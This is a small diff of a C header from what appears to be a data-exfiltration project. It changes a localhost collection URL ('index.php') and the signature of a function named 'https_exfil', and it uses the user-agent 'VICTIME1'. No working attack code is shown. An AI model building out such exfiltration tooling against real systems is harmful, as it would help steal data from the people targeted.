@@ -10,8 +10,8 @@
 #define USERAGENT "VICTIME1"
 #define FILNAL_URL_LEN 1000
 
-#define URL "http://127.0.0.1:8000/index.php"
+#define URL "http://127.0.0.1/index.php"
 
-int https_exfil(const char *, const char *);
+int https_exfil(const char *, const char *, const char *);
 
 #endif
